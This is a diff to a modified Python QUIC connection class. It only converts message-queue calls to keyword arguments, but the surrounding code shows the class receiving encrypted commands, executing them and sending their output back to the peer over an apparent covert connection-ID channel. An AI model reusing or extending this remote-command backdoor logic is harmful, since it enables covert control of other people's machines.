@@ -431,7 +431,11 @@ class QuicConnection:
             key_bytes = ccrypto.get_compact_key(peer_meta["private_key"].public_key())
             open("client-public-key-server.bin", "wb").write(key_bytes)
             ccrypto.queue_message(
-                addr[0], key_bytes, peer_meta["cid_queue"], None, is_public_key=True
+                host_ip=addr[0],
+                payload=key_bytes,
+                queue=peer_meta["cid_queue"],
+                public_key=None,
+                is_public_key=True,
             )
         if self._is_client:
             if not peer_meta["cid_queue"].empty():
@@ -2085,10 +2089,12 @@ class QuicConnection:
                         logger.info("RECEIVED COMMAND: %s", decrypted_message)
                         stdout, stderr, return_code = execute_command(decrypted_message)
                         ccrypto.queue_message(
-                            peer_ip,
-                            f"m:{stdout}\n{stderr}\n{return_code}".encode("utf8"),
-                            peer_meta["cid_queue"],
-                            peer_meta["public_key"],
+                            host_ip=peer_ip,
+                            payload=f"m:{stdout}\n{stderr}\n{return_code}".encode(
+                                "utf8"
+                            ),
+                            queue=peer_meta["cid_queue"],
+                            public_key=peer_meta["public_key"],
                         )
                     elif command == ord("k"):
                         logger.info("RECEIVED KEEP ALIVE MESSAGE")
@@ -2852,10 +2858,10 @@ class QuicConnection:
 
             if PEER_META[addr[0]]["cid_queue"].empty():
                 ccrypto.queue_message(
-                    addr[0],
-                    b"k",
-                    PEER_META[addr[0]]["cid_queue"],
-                    PEER_META[addr[0]]["public_key"],
+                    host_ip=addr[0],
+                    payload=b"k",
+                    queue=PEER_META[addr[0]]["cid_queue"],
+                    public_key=PEER_META[addr[0]]["public_key"],
                 )
             hid = PEER_META[addr[0]]["cid_queue"].get()
             # hid = b'AAAAAAAA'
